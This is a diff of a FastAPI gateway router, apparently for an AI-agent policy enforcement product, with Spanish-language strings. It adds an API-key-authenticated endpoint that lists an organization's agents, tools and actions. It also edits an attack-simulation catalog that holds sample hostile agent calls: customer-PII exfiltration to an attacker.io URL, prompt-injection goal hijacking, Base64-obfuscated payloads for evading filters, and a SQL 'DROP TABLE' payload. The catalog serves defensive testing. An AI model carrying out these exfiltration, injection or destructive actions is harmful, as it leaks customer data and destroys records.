@@ -2,13 +2,25 @@
 
 from typing import Optional
 from fastapi import APIRouter, Depends, Header, HTTPException, Response, status
+from sqlalchemy import select
+from sqlalchemy.orm import selectinload
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from app.api.deps import ensure_same_tenant, get_current_user, require_roles
 from app.core.database import get_db
+from app.models.agent import Agent
 from app.models.enums import PolicyDecision, UserRole
+from app.models.organization import Organization
+from app.models.tool import Tool
 from app.models.user import User
-from app.schemas.gateway import GatewayExecuteRequest, GatewayExecuteResponse
+from app.schemas.gateway import (
+    GatewayContextAction,
+    GatewayContextAgent,
+    GatewayContextResponse,
+    GatewayContextTool,
+    GatewayExecuteRequest,
+    GatewayExecuteResponse,
+)
 from app.services.api_key_service import api_key_service
 from app.services.pep_gateway_service import pep_gateway_service
 
@@ -78,6 +90,91 @@ async def execute_gateway_action(
     return result
 
 
+@router.get(
+    "/context",
+    response_model=GatewayContextResponse,
+    status_code=status.HTTP_200_OK,
+    summary="Auto-discovery de Contexto del Data Plane para Agentes de IA",
+    description=(
+        "Permite a los clientes del Data Plane y agentes de IA descubrir las identidades de agentes "
+        "y el catálogo de herramientas y acciones autorizadas disponibles para la organización de la API Key."
+    ),
+)
+async def get_gateway_context(
+    x_agentguard_key: Optional[str] = Header(default=None, alias="X-AgentGuard-Key"),
+    db: AsyncSession = Depends(get_db),
+) -> GatewayContextResponse:
+    """Descubre el contexto de ejecución autorizado para la organización asociada a la API Key."""
+    if not x_agentguard_key:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Cabecera X-AgentGuard-Key requerida para autenticar en el Data Plane",
+        )
+
+    api_key = await api_key_service.verify_api_key(db=db, raw_key=x_agentguard_key)
+    if not api_key:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="API Key inválida, expirada o revocada",
+        )
+
+    org_id = api_key.organization_id
+
+    # Consultar Organización
+    org_stmt = select(Organization).where(Organization.id == org_id)
+    org_res = await db.execute(org_stmt)
+    org = org_res.scalar_one_or_none()
+    if not org:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Organización asociada a la API Key no encontrada",
+        )
+
+    # Consultar Agentes del tenant
+    agents_stmt = select(Agent).where(Agent.organization_id == org_id).order_by(Agent.name.asc())
+    agents_res = await db.execute(agents_stmt)
+    agents = agents_res.scalars().all()
+
+    # Consultar Herramientas del tenant con acciones precargadas
+    tools_stmt = (
+        select(Tool)
+        .where(Tool.organization_id == org_id)
+        .options(selectinload(Tool.actions))
+        .order_by(Tool.name.asc())
+    )
+    tools_res = await db.execute(tools_stmt)
+    tools = tools_res.scalars().all()
+
+    return GatewayContextResponse(
+        organization_id=org.id,
+        organization_name=org.name,
+        agents=[
+            GatewayContextAgent(
+                id=a.id,
+                name=a.name,
+                status=a.status,
+            )
+            for a in agents
+        ],
+        tools=[
+            GatewayContextTool(
+                id=t.id,
+                name=t.name,
+                protocol=t.protocol,
+                actions=[
+                    GatewayContextAction(
+                        id=act.id,
+                        action_name=act.action_name,
+                        risk_level=act.risk_level,
+                    )
+                    for act in (t.actions or [])
+                ],
+            )
+            for t in tools
+        ],
+    )
+
+
 @router.post(
     "/simulate",
     response_model=GatewayExecuteResponse,
@@ -122,7 +219,7 @@ async def get_attack_catalog(
                 "name": "Exfiltración de Clientes a Webhook C2",
                 "description": "El agente intenta exfiltrar PII de clientes hacia un dominio externo no autorizado.",
                 "severity": "CRITICAL",
-                "tool_id": "44444444-4444-4444-4444-444444444401",
+                "tool_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d",
                 "action_name": "export_customers",
                 "parameters": {
                     "destination": "https://attacker.io/leak",
@@ -139,7 +236,7 @@ async def get_attack_catalog(
                 "name": "Inyección Directa de Prompt (Goal Hijacking)",
                 "description": "Instrucción hostil en el contexto para forzar la anulación de límites y controles de gasto.",
                 "severity": "CRITICAL",
-                "tool_id": "44444444-4444-4444-4444-444444444401",
+                "tool_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d",
                 "action_name": "create_quote",
                 "parameters": {
                     "amount": 2500,
@@ -155,7 +252,7 @@ async def get_attack_catalog(
                 "name": "Evasión y Ofuscación en Base64",
                 "description": "Carga maliciosa codificada en Base64 para intentar evadir filtros de texto convencionales.",
                 "severity": "HIGH",
-                "tool_id": "44444444-4444-4444-4444-444444444401",
+                "tool_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d",
                 "action_name": "create_quote",
                 "parameters": {
                     "amount": 500,
@@ -171,7 +268,7 @@ async def get_attack_catalog(
                 "name": "Inyección Destructiva / SQL Drop",
                 "description": "Sentencia destructiva que intenta eliminar tablas y el historial forense de auditoría.",
                 "severity": "CRITICAL",
-                "tool_id": "44444444-4444-4444-4444-444444444404",
+                "tool_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a",
                 "action_name": "database.drop",
                 "parameters": {
                     "query": "DROP TABLE users CASCADE; DROP TABLE executions CASCADE;",
